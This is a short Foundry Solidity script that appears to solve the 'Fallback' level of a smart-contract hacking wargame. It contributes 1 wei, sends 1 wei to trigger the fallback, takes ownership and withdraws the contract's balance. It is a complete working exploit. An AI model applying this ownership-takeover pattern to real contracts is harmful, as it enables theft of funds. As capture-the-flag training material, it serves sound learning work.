// SPDX-License-Identifier: MIT
pragma solidity ^0.8.33;

import "../src/Level1.sol";
import "forge-std/Script.sol";
import "forge-std/console.sol";

contract FallbackSolution is Script {

    function run() external {

        uint256 pk = vm.envUint("PRIVATE_KEY");

        Fallback fallbackInstance =
            Fallback(payable(0xa48815755a8cec17eCe7dd6EFa8f4eD7Aff0B994));

        vm.startBroadcast(pk);

        fallbackInstance.contribute{value: 1 wei}();

        (bool success,) = address(fallbackInstance).call{value: 1 wei}("");
        require(success);

        console.log("New Owner:", fallbackInstance.owner());

        fallbackInstance.withdraw();

        vm.stopBroadcast();
    }
}